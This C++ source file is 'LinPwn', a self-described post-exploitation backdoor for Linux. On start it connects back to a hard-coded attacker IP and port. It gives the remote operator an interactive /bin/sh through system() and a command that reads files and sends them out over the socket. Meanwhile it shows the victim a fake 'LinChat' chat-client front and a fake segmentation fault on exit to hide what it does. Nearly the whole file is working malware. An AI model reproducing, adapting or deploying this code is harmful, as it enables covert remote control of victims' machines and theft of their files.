/* LinPwn
   
   Post Exploitation interactive Backdoor 

   Copyright (C) 2019  Andromeda3(3XPL017)

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program. If not, see <https://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>


#define BUFFER 40
#define SD 0


void banner() {
  write(SD, "\x1b[32mLinPwn\nCreated By Andromeda.\n\0", 35);
  write(SD, "Type banner to show this banner.\n\0", 33);
  write(SD, "Type commands to list commands.\n\0", 33);
  write(SD, "Type exit to quit LinPwn.\n\0", 28);
}


void get_input(char *option) {
  fgets(option, BUFFER, stdin);

  for (unsigned int i = 0; i <= strnlen(option, BUFFER); i++) {
    if (option[i] == '\n') {
        option[i] = '\0';
    }
  }
}


class Connection {
  const char *ip = "192.168.1.165";  // Change this
  const int port = 8000;  // Change this
  struct sockaddr_in address;

 public:
  void connection_open() {
    const int connecting = socket(AF_INET, SOCK_STREAM, 0);;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(ip);
    address.sin_port = htons(port);
    connect(connecting, (struct sockaddr *)&address, sizeof(address));
    dup2(connecting, SD);
    dup2(connecting, 1);
  }
};


class Commands {
  void open_file(char *option) {
    FILE *file = fopen(option, "rb");

    if (!file) {
      write(SD, "\x1b[33m Cannot open file.\n\0", 25);
      return;
    }

    fseek(file, 0, SEEK_END);
    int size = ftell(file);
    fseek(file, 0, SEEK_SET);
    char *filecontent = new char[size];

    fread(filecontent, 1, size, file);
    filecontent[size] = '\0';
    send(SD, filecontent, size, 0);
    fclose(file);
    delete[] filecontent;
  }


 public:
  void list_commands() {
    write(SD, "\x1b[32mCommands: \n\0", 18);
    write(SD, "1. shell\n\0", 10);
    write(SD, "2. readfile\n\0", 14);
  }


  void shell() {
    char option[BUFFER];
    char errors[BUFFER] = " 2>/dev/null\0";
    write(SD, "\x1b[32mExecuting /bin/sh\n\0", 25);
    write(SD, "Type exit to return to LinPwn.\n\0", 33);

    for (;;) {
      write(SD, "\x1b[31mShell> \0", 11);
      write(SD, "\x1b[32m \0", 8);
      get_input(option);

      if (strncmp(option, "exit\0", 5) == 0) {
        break;
      } else {
        strncat(option, errors, BUFFER);
        system(option);
      }
    }
  }


  void read_file() {
    char option[BUFFER];
    write(SD, "\x1b[32mType full path of file to view contents...\n\0", 50);
    write(SD, "Type exit to return to LinPwn.\n\0", 33);

    for (;;) {
      write(SD, "\x1b[31mReadFile> \0", 14);
      write(SD, "\x1b[32m \0", 8);
      get_input(option);

      if (strncmp(option, "exit\0", 5) == 0) {
        break;
      } else {
        open_file(option);
      }
    }
  }


  void quit() {
    write(SD, "\x1b[33mClosing connection...\n\0", 28);
  }
};


int handler() {
  Commands commands;
  char *option = new char[BUFFER];
  get_input(option);

  if (strncmp(option, "shell\0", 6) == 0) {
    write(2, "AnonymousUser: \0", 15);
    write(2, "Hello\n\0", 7);
    commands.shell();
    write(2, "Reconnecting...\n\0", 16);
    write(2, "Welcome to the chat room.\n\0", 26);
    write(2, "-------------------------\n\0", 26);
  } else if (strncmp(option, "readfile\0", 9) == 0) {
    write(2, "Reconnecting...\n\0", 16);
    commands.read_file();
    write(2, "Unable to connect to chat server\n\0", 35);
    write(2, "Retrying...\n\0", 14);
  } else if (strncmp(option, "commands\0", 10) == 0) {
    commands.list_commands();
  } else if (strncmp(option, "exit\0", 5) == 0) {
    commands.quit();
    return 1;
  } else if (strncmp(option, "banner\0", 7) == 0) {
    banner();
  } else if (strncmp(option, "", 1) == 0) {
    return 0;
  } else {
    write(SD, "\x1b[33mNot a valid option\n\0", 25);
  }

  delete[] option;
  return 0;
}


int main() {
  write(2, "\x1b[32mLinChat v3.0.4\n\0", 20);
  write(2, "Connecting to the chat server...\n\0", 34);
  Connection connection;
  connection.connection_open();
  write(2, "Connected\n\0", 10);
  write(2, "Welcome to the chat room.\n\0", 26);
  write(2, "-------------------------\n\0", 26);
  banner();

  for (;;) {
    write(SD, "\x1b[31m>>> \0", 10);
    if (handler() == 1) break;
  }

  write(2, "\x1b[0mSegmentation fault\n\0", 25);
  return 0;
}
